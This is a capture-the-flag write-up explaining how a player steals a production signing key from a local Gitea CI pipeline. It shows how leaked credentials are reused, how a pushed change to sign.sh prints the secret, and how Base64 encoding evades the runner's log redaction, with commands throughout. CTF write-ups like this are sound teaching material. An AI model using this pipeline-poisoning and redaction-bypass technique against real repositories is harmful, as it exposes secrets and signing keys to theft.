# Vanguard Orbital Security

| | |
|---|---|
| **Category** | Ground Operations |
| **Points** | 480 |
| **Solves** | 115 |

## Description

Seems like Meridian is stuck again. Good news for you if you want the Ion$. They were even kind enough to provide you with a foothold this time, more info below:

> [INTERCEPTED TRANSMISSION: VANGUARD ORBITAL SECURITY]
> Priority: CRITICAL — Subject: Deprecation of Local Signing Keys
>
> Effective immediately, local compiling and binary signing for the Vanguard CubeSat constellation is strictly prohibited. The PROD_SIGNING_KEY has been securely injected into the internal CI/CD runner environments. The internal Gitea server (127.0.0.1:3000) is air-gapped from the public net. Security is absolute.

Find a way to exfiltrate the production signing key.

**Attachments:** Shell access at `https://starpwn-15e3c10ca203-bad-gitea-0-0.chals.io`

## Solution

### Steps

**1. Enumerate the environment**

Upon getting shell access, inspect the home directory for credentials:

```bash
cat backup.env        # GITEA_USER=builddev, GITEA_PASS=devsync_9f3a_build
cat .git-credentials  # http://builddev:devsync_9f3a_build@127.0.0.1:3000
cat notes.txt         # internal git at http://127.0.0.1:3000
```

**2. Discover the internal Gitea repository**

Use the leaked credentials to list accessible repositories via the Gitea API:

```bash
curl -s -u builddev:devsync_9f3a_build http://127.0.0.1:3000/api/v1/user/repos
```

Finds `challenges/build-service` — a private CubeSat release pipeline with push access granted to `builddev`.

**3. Clone and analyze the CI/CD workflow**

```bash
git clone http://builddev:devsync_9f3a_build@127.0.0.1:3000/challenges/build-service.git
cat .gitea/workflows/release.yml
```

Key findings:
- `SIGNING_KEY: ${{ secrets.PROD_SIGNING_KEY }}` is injected as an environment variable into every CI run
- `scripts/sign.sh` uses `$SIGNING_KEY` to sign release artifacts
- The workflow triggers on every push to any branch — so any push runs CI with the real secret

**4. Attempt 1 — print the raw key (blocked)**

Add a debug line to `sign.sh` and push to trigger CI:

```bash
cat >> scripts/sign.sh << 'EOF'
echo "DEBUG_SIGNING_KEY=${SIGNING_KEY}"
EOF
git add scripts/sign.sh && git commit -m "debug: add signing diagnostics" && git push origin main
```

The CI runner sanitizes secrets in log output as `***` — raw value is hidden.

**5. Attempt 2 — Base64-encode to bypass log sanitization**

The sanitizer only redacts the exact plaintext secret. Encoding it first evades detection:

```bash
sed -i '/DEBUG_SIGNING_KEY/d' scripts/sign.sh
cat >> scripts/sign.sh << 'EOF'
echo "DEBUG_SIGNING_KEY_B64=$(printf '%s' "${SIGNING_KEY}" | base64)"
EOF
git add scripts/sign.sh && git commit -m "debug: base64 encode diagnostics" && git push origin main
```

**6. Read the CI run logs**

Login to Gitea, grab the CSRF token from the response HTML, and fetch the logs for run #3:

```bash
curl -s -c /tmp/cookies.txt -X POST "http://127.0.0.1:3000/user/login" \
  -d "user_name=builddev&password=devsync_9f3a_build"

CSRF="<token from response HTML>"
curl -s -b /tmp/cookies.txt -H "x-csrf-token: $CSRF" \
  "http://127.0.0.1:3000/challenges/build-service/actions/runs/3/jobs/0/logs"
```

The log contains:

```
DEBUG_SIGNING_KEY_B64=U1RBUlBXTntrMWNrXzEwOTFjXzcwXzdoM19jdTI4XzRuZF9kMF83aDNfMW1wMDU1MTgxM30=
```

**7. Decode the Base64 value**

```bash
echo "U1RBUlBXTntrMWNrXzEwOTFjXzcwXzdoM19jdTI4XzRuZF9kMF83aDNfMW1wMDU1MTgxM30=" | base64 -d
STARPWN{k1ck_1091c_70_7h3_cu28_4nd_d0_7h3_1mp0551813}
```

### Attack Summary

```
Leaked credentials in home directory (.git-credentials, backup.env)
    -> Clone internal Gitea repo (challenges/build-service) with push access
    -> Modify scripts/sign.sh to Base64-encode $SIGNING_KEY
    -> Push triggers CI runner which executes modified script with real secret
    -> Base64 value appears in CI logs (bypasses log sanitizer)
    -> Decode -> flag
```

## Flag

```
STARPWN{k1ck_1091c_70_7h3_cu28_4nd_d0_7h3_1mp0551813}
```
